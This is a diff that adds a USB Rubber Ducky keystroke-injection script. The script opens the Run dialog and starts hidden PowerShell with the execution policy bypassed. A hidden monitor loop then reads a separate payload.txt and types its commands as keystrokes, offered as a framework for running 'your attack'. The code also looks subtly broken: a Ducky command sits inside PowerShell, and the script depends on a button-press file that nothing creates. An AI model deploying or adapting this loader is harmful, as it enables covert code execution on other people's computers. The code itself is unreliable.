@@ -1,0 +1,80 @@
+REM ==============================================
+REM USB RUBBER DUCKY – BUTTON-TRIGGERED PAYLOAD
+REM
+REM Author: Mr.Ender
+REM
+REM   HOW TO USE:
+REM   1. Save this file as: inject.txt
+REM   2. Put inject.txt on the Ducky root
+REM   3. Create a SEPARATE file: payload.txt
+REM   4. Paste your attack into payload.txt
+REM   5. Double-press the DUCKY BUTTON
+REM   6. → Your payload runs instantly!
+REM
+REM   PAYLOAD IS SEPARATE → payload.txt
+REM ==============================================
+
+REM ==============================================
+REM 1. START IN STORAGE MODE
+REM ==============================================
+ATTACKMODE STORAGE
+
+REM ==============================================
+REM 2. DEFAULT DELAY
+REM ==============================================
+DEFAULTDELAY 500
+
+REM ==============================================
+REM 3. LAUNCH HIDDEN MONITOR
+REM ==============================================
+GUI r
+DELAY 1000
+STRING powershell -NoP -W Hidden -C Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
+ENTER
+DELAY 500
+
+REM ==============================================
+REM 4. MONITOR: Wait for payload.txt + double button press → RUN
+REM ==============================================
+STRING powershell -NoP -W Hidden -C ^
+$payloadPath = \"D:\\payload.txt\"; ^
+$pressCount = 0; ^
+$lastPress = [DateTime]::MinValue; ^
+$timeout = 800; ^
+while ($true) { ^
+    if ((Test-Path $payloadPath) -and (Test-Path \"$env:TEMP\\ducky_button_press\")) { ^
+        Remove-Item \"$env:TEMP\\ducky_button_press\" -Force; ^
+        $now = Get-Date; ^
+        if ($pressCount -eq 0) { $pressCount = 1; $lastPress = $now; } ^
+        elseif ($pressCount -eq 1 -and ($now - $lastPress).TotalMilliseconds -le $timeout) { ^
+            ATTACKMODE HID; ^
+            $lines = Get-Content $payloadPath; ^
+            foreach ($line in $lines) { ^
+                $cmd = $line.Trim(); ^
+                if ($cmd -eq \"\" -or $cmd.StartsWith(\"REM\")) { continue; } ^
+                if ($cmd.StartsWith(\"ATTACKMODE\")) { continue; } ^
+                if ($cmd.StartsWith(\"DEFAULTDELAY\")) { continue; } ^
+                if ($cmd.StartsWith(\"DELAY\")) { ^
+                    $delay = [int]($cmd -replace \"DELAY \", \"\"); ^
+                    Start-Sleep -Milliseconds $delay; ^
+                } elseif ($cmd.StartsWith(\"STRING\")) { ^
+                    $text = $cmd -replace \"^STRING \", \"\"; ^
+                    [System.Windows.Forms.SendKeys]::SendWait($text); ^
+                } elseif ($cmd -eq \"ENTER\") { ^
+                    [System.Windows.Forms.SendKeys]::SendWait(\"{ENTER}\"); ^
+                } elseif ($cmd -eq \"GUI r\") { ^
+                    [System.Windows.Forms.SendKeys]::SendWait(\"^{ESC}\"); Start-Sleep -m 200; ^
+                    [System.Windows.Forms.SendKeys]::SendWait(\"r\"); ^
+                } ^
+            }; ^
+            break; ^
+        } else { $pressCount = 1; $lastPress = $now; } ^
+    } ^
+    Start-Sleep -m 100; ^
+}
+ENTER
+
+REM ==============================================
+REM 5. END – NO PAYLOAD HERE
+REM         Enter nuthing past hear!
+REM ==============================================
